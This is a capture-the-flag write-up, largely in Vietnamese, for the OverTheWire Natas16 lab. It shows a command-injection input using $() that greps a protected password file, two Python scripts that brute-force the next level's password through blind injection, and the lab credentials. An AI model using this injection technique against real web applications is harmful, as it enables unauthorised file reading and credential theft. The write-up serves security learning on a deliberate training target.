
* Lab: [Natas16](http://natas16.natas.labs.overthewire.org)
* Username: natas16
* Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
* Descript: RCE vulnerability
* Purpose: Get credentials of Natas17 Labs (at /etc/natas_webpass/natas17) by exploiting RCE vulnerability
* Writeup by Me^^

![Ảnh chụp màn hình 2023-12-23 015444](https://hackmd.io/_uploads/SJ7soL7w6.png)

Truy cập lab được giao diện như trên ,ta thấy có một form search như trên, let's trying test:

![Ảnh chụp màn hình 2023-12-23 020904](https://hackmd.io/_uploads/BkWSyPQDa.png)

---
![Ảnh chụp màn hình 2023-12-23 021010](https://hackmd.io/_uploads/SJ0SkPmD6.png)

---
Xem qua source code : 
![Ảnh chụp màn hình 2023-12-23 021209](https://hackmd.io/_uploads/S18glPmDa.png)

Here's index-source.html:
![Ảnh chụp màn hình 2023-12-23 021331](https://hackmd.io/_uploads/BkMWlvQv6.png)

Giải thích sơ qua đoạn php xử lý trên: sau khi nhận được request từ form trên , key sẽ được gán giá trị từ  field input để thực hiện xử lý.

Các ký tự  đặc biệt `;`  `|`  `&` `\` `'`  `"` bị chặn khỏi chuỗi nhằm ngăn thực hiện injection attack. Tìm thêm các loại injection một lúc ,thấy rằng `$()` (lệnh thực thi và trả về kêt quả trên linux) không bị chặn khỏi input 
Thực hiện input sau : `$(grep a /etc/natas_webpass/natas17)Sunday` and press Search:

![Ảnh chụp màn hình 2023-12-23 024148](https://hackmd.io/_uploads/Hy7sUvXwa.png)


Có vẻ như `a` không có trong passwd , vì `$(...)` không trả về giá trị , do đó input chỉ chứa `Sunday`. Do brute-force 32 ký tự trong password với 62 ký tự `a-zA-Z0-9` khá là lâu, ta build code thực hiện tìm giá trị trong passwd sau: 

```
#python
import requests
import string

charactor = string.ascii_lowercase + string.ascii_uppercase + string.digits
url = "http://natas16.natas.labs.overthewire.org/"
natas16_username = "natas16"
natas16_passwd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
charString = ""

for char in charactor:
    print("Trying : "+char)
    #Thực hiện request tới web , thử từng giá trị char trong 62 ký tự chữ và số!
    response = requests.get(url, params={"needle": f"$(grep {char} /etc/natas_webpass/natas17)Sunday"}, auth=(natas16_username, natas16_passwd))
    content = response.text
    #Ký tự thỏa mãn được nối vào charString!
    if "Sunday" not in content:
        print(f"Tim thay: {char}")
        charString += char
print(charString)
```
![Ảnh chụp màn hình 2023-12-23 030311](https://hackmd.io/_uploads/BJ6qsPXDp.png)
Ta thu được chuỗi các ký tự trong password là: `bdhkmnsuvBCEHIKLRSUX0179` 
Sửa chút code ,thực hiện tìm ký tự lần lượt theo các vị trí sử dụng `grep ^` như sau: 
```
#python
import requests
import string

charactor = string.ascii_lowercase + string.ascii_uppercase + string.digits
url = "http://natas16.natas.labs.overthewire.org/"
natas16_username = "natas16"
natas16_passwd = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"
password = ""
charString = "bdhkmnsuvBCEHIKLRSUX0179"

while (len(password) < 32):
    for char in charString:
        print("Try: ", char)
        # Sử dụng grep ^ để kiểm tra chuỗi có bắt đầu bằng {password}{char} !{password} ban đầu rỗng
        response = requests.get(url, params={ "needle": f"$(grep ^{password}{char} /etc/natas_webpass/natas17)Sunday", "submit": "Search"}, auth=(natas16_username, natas16_passwd))
        content = response.text
        if "Sunday" not in content:
            print("Tim thay: ", char)
            # Nối từng ký tự tìm được vào password
            password += char
            break
print("Password: ", password)
```
Chạy code và đi uống nước , quay lại ta tìm được password cho lab Natas17: XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd

![Ảnh chụp màn hình 2023-12-23 031624](https://hackmd.io/_uploads/HJR3CvmvT.png)

Do vậy , việc lọc đầu vào không triệt để gây ra những lỗ hổng dẫn đến việc thực thi code từ xa ,tiềm tàng khả năng gây ảnh hưởng đến hệ thống.
